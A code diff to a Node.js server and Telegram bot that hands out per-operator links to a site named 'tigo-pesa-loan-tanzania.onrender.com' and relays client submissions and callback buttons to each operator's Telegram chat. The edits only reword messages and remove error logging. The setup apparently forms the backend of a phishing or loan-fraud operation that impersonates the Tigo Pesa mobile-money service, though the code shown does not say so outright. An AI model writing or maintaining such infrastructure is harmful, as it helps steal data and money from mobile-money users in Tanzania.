@@ -1,5 +1,5 @@
 /**
- * **MIXX BY YAS - ISOLATED ISOLATED ROUTING & COMMAND SERVER**
+ * **MIXX BY YAS - STRICT ISOLATED SUFFIX ROUTING SERVER**
  */
 
 const express = require('express');
@@ -24,9 +24,9 @@ let bot = null;
 const sessions = new Map();
 
 /**
- * **FORCED ISOLATED CHAT ID RESOLUTION**
- * Directly checks and forces mapping for ADMIN_02, ADMIN_01, etc., 
- * ensuring requests explicitly target their corresponding environment variable.
+ * **STRICT ISOLATED CHAT ID RESOLUTION**
+ * Maps explicit custom end number codes (e.g., ADMIN_01, ADMIN_02, ADMIN_03) 
+ * ensuring requests remain entirely isolated to their specific unique target.
  */
 function resolveAdminChatId(adminKeyOrId) {
   if (!adminKeyOrId) return process.env.ADMIN_01 || null;
@@ -96,15 +96,12 @@ async function initBot() {
   bot.on('polling_error', (err) => console.error('[Bot] polling_error:', err?.message || err));
   bot.on('webhook_error', (err) => console.error('[Bot] webhook_error:', err?.message || err));
 
-  // BOT COMMAND SETUP AND REGISTRATION
   try {
     await bot.setMyCommands([
-      { command: 'start', description: 'Register and get your unique isolated admin application link' },
-      { command: 'help', description: 'Show operational command instructions' }
+      { command: 'start', description: 'Register and obtain your unique isolated admin link' },
+      { command: 'help', description: 'Show operational command guidance' }
     ]);
-  } catch (err) {
-    console.error('[Bot] Failed to set bot commands:', err);
-  }
+  } catch (err) {}
 
   bot.onText(/\/start/, async (msg) => {
     try {
@@ -125,15 +122,15 @@ async function initBot() {
         }
       }
 
-      const cleanBrowseLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${assignedCode}`;
+      const uniqueIsolatedLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${assignedCode}`;
 
       const userWelcomeInfo = 
-        `🚨 **Admin Link Registered Successfully!**\n\n` +
+        `🚨 **Unique Admin Link Registered Successfully!**\n\n` +
         `👤 **Name:** ${fullName}\n` +
         `🆔 **Chat ID:** \`${chatId}\`\n` +
-        `🔢 **Assigned Code:** \`${assignedCode}\`\n` +
+        `🔢 **Assigned Unique Code:** \`${assignedCode}\`\n` +
         `🏷 **Username:** ${username}\n\n` +
-        `🔗 **Your Unique Application Link:**\n${cleanBrowseLink}`;
+        `🔗 **Your Isolated Application Link:**\n${uniqueIsolatedLink}`;
 
       await bot.sendMessage(chatId, userWelcomeInfo, { 
         parse_mode: 'Markdown',
@@ -148,15 +145,13 @@ async function initBot() {
     try {
       const chatId = String(msg.chat.id);
       const helpText =
-        `🛠 **Admin Bot Command Guide**\n\n` +
-        `/start - Register your chat ID and obtain your isolated tracking link.\n` +
-        `/help - Display this command instruction menu.\n\n` +
-        `*Note:* When clients interact via your personal link, alerts and buttons route strictly to your chat.`;
+        `🛠 **Isolated Admin Bot Guide**\n\n` +
+        `/start - Register your chat ID and get your distinct custom-suffixed link.\n` +
+        `/help - View instruction menu.\n\n` +
+        `*Security Note:* Submissions and actions from clients through your unique link will exclusively target your chat.`;
 
       await bot.sendMessage(chatId, helpText, { parse_mode: 'Markdown' });
-    } catch (err) {
-      console.error('[Bot] Error handling /help command:', err);
-    }
+    } catch (err) {}
   });
 
   bot.on('callback_query', async (query) => {
@@ -365,4 +360,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-    
+  
